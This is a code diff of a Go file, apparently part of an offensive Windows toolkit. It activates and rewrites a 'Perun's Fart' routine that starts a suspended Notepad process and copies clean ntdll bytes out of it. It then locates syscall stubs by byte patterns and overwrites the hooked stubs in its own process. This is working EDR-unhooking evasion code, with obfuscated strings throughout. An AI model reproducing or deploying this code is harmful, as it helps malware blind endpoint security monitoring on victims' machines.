@@ -642,28 +642,11 @@ func npvm(sysid uint16, processHandle uintptr, baseAddress, regionSize *uintptr,
 }
 
 
-/*
+
 
 //Perun's Fart unhook function
 //todo: change syscall package into gabh
 func PerunsFart() error {
-	//get customsyscall
-	//todo: change registry ops into syscall
-	var customsyscall uint16
-	regkey, _ := registry.OpenKey(registry.LOCAL_MACHINE, string([]byte{'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}), registry.QUERY_VALUE)
-	CurrentVersion, _, _ := regkey.GetStringValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}))
-	MajorVersion, _, err := regkey.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'a', 'j', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
-	if err == nil {
-		MinorVersion, _, _ := regkey.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'i', 'n', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
-		CurrentVersion = strconv.FormatUint(MajorVersion, 10) + "." + strconv.FormatUint(MinorVersion, 10)
-	}
-	regkey.Close()
-
-	if CurrentVersion == "10.0" {
-		customsyscall = 0x50
-	} else {
-		return fmt.Errorf("winver low")
-	}
 
 	//create suspended new process
 	var si syscall.StartupInfo
@@ -684,7 +667,7 @@ func PerunsFart() error {
 		nil,
 		nil,
 		false,
-		windows.CREATE_SUSPENDED,
+		windows.CREATE_NEW_CONSOLE|windows.CREATE_SUSPENDED,
 		nil,
 		nil,
 		&si,
@@ -694,9 +677,9 @@ func PerunsFart() error {
 		return err
 	}
 
-	fmt.Println("Start Suspended Notepad.exe and Sleep 5s pid: " + strconv.Itoa(int(pi.ProcessId)))
+	fmt.Println("Start Suspended Notepad.exe and Sleep 1s pid: " + strconv.Itoa(int(pi.ProcessId)))
 
-	windows.SleepEx(5000, false)
+	windows.SleepEx(1000, false)
 
 	//get ntdll handler
 	GetModuleHandleA := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc("GetModuleHandleA")
@@ -725,6 +708,7 @@ func PerunsFart() error {
 	if ntHeader == nil {
 		return fmt.Errorf("get ntHeader err")
 	}
+	fmt.Printf("ModuleBase: 0x%x\n",addrMod)
 
 	windows.SleepEx(50, false)
 
@@ -733,16 +717,20 @@ func PerunsFart() error {
 	if modSize == 0 {
 		return fmt.Errorf("get module size err")
 	}
-	//fmt.Println("ntdll module size: " + strconv.Itoa(int(modSize)))
+	fmt.Println("ntdll module size: " + strconv.Itoa(int(modSize)))
 
 	cache := make([]byte, modSize)
 
+	var lpNumberOfBytesRead uintptr
+
 	//read clean ntdll from new process
 	//todo: change readprocessmemory into Nt api
-	err = windows.ReadProcessMemory(windows.Handle(uintptr(pi.Process)), addrMod, &cache[0], uintptr(modSize), nil)
+	err = windows.ReadProcessMemory(windows.Handle(uintptr(pi.Process)), addrMod, &cache[0], uintptr(modSize), &lpNumberOfBytesRead)
 	if err != nil {
 		return err
 	}
+	fmt.Printf("Read: %d\n",lpNumberOfBytesRead)
+
 	e := syscall.TerminateProcess(pi.Process, 0)
 	if e != nil {
 		return e
@@ -752,59 +740,127 @@ func PerunsFart() error {
 
 	windows.SleepEx(50, false)
 
-	dll := cache
-	if err != nil {
-		return err
-	}
+	fmt.Println("[+] Done ")
 
-	//parsing buff into pe format
-	file, error1 := pe.NewFileFromMemory(bytes.NewReader(cache))
-	if error1 != nil {
-		return error1
-	}
+	pe0,_ := pe.NewFileFromMemory(bytes.NewReader(cache))
 
-	//check out the .text section offset
-	x := file.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
-	bytes := dll[x.Offset:x.Size]
-	dllBase := Ntdll
-	dllOffset := uint(dllBase) + uint(x.VirtualAddress)
-	var oldfartcodeperms uintptr
-	regionsize := uintptr(len(bytes))
-	handlez := uintptr(0xffffffffffffffff)
+	//ntHdrs   := ntH(uintptr(unsafe.Pointer(&dll[0])))
 
-	runfunc, _ := npvm(
-		customsyscall,
-		handlez,
-		(*uintptr)(unsafe.Pointer(&dllOffset)),
-		&regionsize,
-		syscall.PAGE_EXECUTE_READWRITE,
-		&oldfartcodeperms,
-	)
-	if runfunc != 0 {
-	}
+	//fmt.Printf("+] Sections to enumerate is %d\n",ntHdrs.FileHeader.NumberOfSections)
+	//pCurrentSection := uintptr(unsafe.Pointer(ntHdrs))+unsafe.Sizeof(IMAGE_NT_HEADERS{})
 
-	for i := 0; i < len(bytes); i++ {
-		loc := uintptr(dllOffset + uint(i))
-		mem := (*[1]byte)(unsafe.Pointer(loc))
-		(*mem)[0] = bytes[i]
-	}
-	//fmt.Println("Unhooked Ntdll...")
+	SecHdr := pe0.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
+	//secHdr := (*SectionHeader)(unsafe.Pointer(&pCurrentSection))
+/*
 
-	runfunc, _ = npvm(
-		customsyscall,
-		handlez,
-		(*uintptr)(unsafe.Pointer(&dllOffset)),
-		&regionsize,
-		oldfartcodeperms,
-		&oldfartcodeperms,
-	)
-	if runfunc != 0 {
+	for i := 0; i < int(ntHdrs.FileHeader.NumberOfSections); i++{
+		secHdr = (*SectionHeader)(unsafe.Pointer(&pCurrentSection))
+		if strings.Contains(secHdr.Name, ".text"){
+			fmt.Printf("[+] .text section is at 0x%x\n",pCurrentSection)
+			break
+		}
+		sizeOfSection := unsafe.Sizeof(pe.SectionHeader{})
+		pCurrentSection += sizeOfSection
 	}
-	return nil
-}
 
  */
 
+	fmt.Printf("Section VirtualSize: %d\n",SecHdr.VirtualSize)
+
+	startOffset := findFirstSyscallOffset(cache,int(SecHdr.VirtualSize), addrMod)
+
+	endOffset := findLastSyscallOffset(cache,int(SecHdr.VirtualSize), addrMod)
+
+	cleanSyscalls := cache[startOffset:endOffset]
+
+	var writenum uintptr
+	//writeprocessmemory will set virtualProtect
+	e =windows.WriteProcessMemory(0xffffffffffffffff,addrMod+uintptr(startOffset),&cleanSyscalls[0],uintptr(len(cleanSyscalls)),&writenum)
+	if e != nil{
+		return e
+	}
+
+	fmt.Printf("Write %d\n",writenum)
+
+	/*
+	var lpflOldProtect uint32
+	e = windows.VirtualProtect(addrMod+uintptr(startOffset),uintptr(len(cleanSyscalls)),windows.PAGE_EXECUTE_READWRITE,&lpflOldProtect)
+	if e != nil{
+		return e
+	}
+
+	memcpy(addrMod+uintptr(startOffset),cleanSyscalls)
+
+	e = windows.VirtualProtect(addrMod+uintptr(startOffset),uintptr(len(cleanSyscalls)),lpflOldProtect,&lpflOldProtect)
+	if e != nil{
+		return e
+	}
+
+	 */
+
+	return nil
+
+}
+
+func findFirstSyscallOffset(pMem []byte,size int,moduleAddress uintptr) int {
+	offset := 0
+	pattern1 := []byte{ 0x0f, 0x05, 0xc3 }
+	pattern2 := []byte{ 0xcc, 0xcc, 0xcc }
+
+	// find first occurance of syscall+ret instructions
+	for i:=0; i < size - 3; i++{
+		instructions := []byte{pMem[i], pMem[i + 1], pMem[i + 2]}
+
+		if instructions[0] == pattern1[0] && instructions[1] == pattern1[1] && instructions[2] == pattern1[2]{
+			offset = i
+			break
+		}
+	}
+
+
+	// find the beginning of the syscall
+	for i := 3; i < 50; i++{
+		instructions := []byte{ pMem[offset - i], pMem[offset - i + 1], pMem[offset - i + 2] }
+		if instructions[0] == pattern2[0] && instructions[1] == pattern2[1] && instructions[2] == pattern2[2]{
+			offset = offset - i + 3
+			break
+		}
+	}
+
+	addr := moduleAddress+uintptr(offset)
+
+	fmt.Printf("[+] First syscall found at offset: 0x%x, addr: 0x%x\n", offset, addr)
+
+	return offset
+}
+
+
+func findLastSyscallOffset(pMem []byte,size int,moduleAddress uintptr) int {
+
+	offset := 0
+	pattern := []byte{ 0x0f, 0x05, 0xc3, 0xcd, 0x2e, 0xc3, 0xcc, 0xcc, 0xcc }
+
+	for i := size - 9; i > 0; i--{
+		instructions := []byte{ pMem[i], pMem[i + 1], pMem[i + 2], pMem[i + 3], pMem[i + 4], pMem[i + 5], pMem[i + 6], pMem[i + 7], pMem[i + 8] }
+
+		if instructions[0] == pattern[0] && instructions[1] == pattern[1] && instructions[2] == pattern[2]{
+			offset = i + 6
+			break
+		}
+	}
+
+	addr := moduleAddress + uintptr(offset)
+
+	fmt.Printf("[+] Last syscall found at offset: 0x%x, addr: 0x%x\n", offset, addr)
+
+	return offset
+}
+
+func memcpy(base uintptr, buf []byte) {
+	for i := 0; i < len(buf); i++ {
+		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
+	}
+}
 
 
 func ntH(baseAddress uintptr) *IMAGE_NT_HEADERS {
